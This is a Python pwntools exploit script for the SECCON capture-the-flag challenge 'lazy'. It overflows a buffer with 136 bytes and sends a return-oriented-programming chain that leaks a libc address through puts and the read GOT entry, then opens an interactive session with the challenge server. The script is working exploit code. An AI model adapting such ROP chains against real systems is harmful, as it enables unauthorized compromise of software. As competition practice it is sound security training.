#!/usr/bin/env python2

from pwn import *

elf = ELF('./lazy')
#p = process('./lazy')
p = remote('lazy.chal.seccon.jp', 33333)

p.recv()
p.sendline('2')

puts = elf.plt['puts']
read_got = elf.got['read']
main = elf.symbols['main']
pop_rdi = 0x4015f3

payload = 'A'*136
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts)
payload += p64(main)

p.recv()
p.sendline(payload)

p.recv()
p.recv()
p.sendline(payload)

leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
print hex(leak)

p.interactive()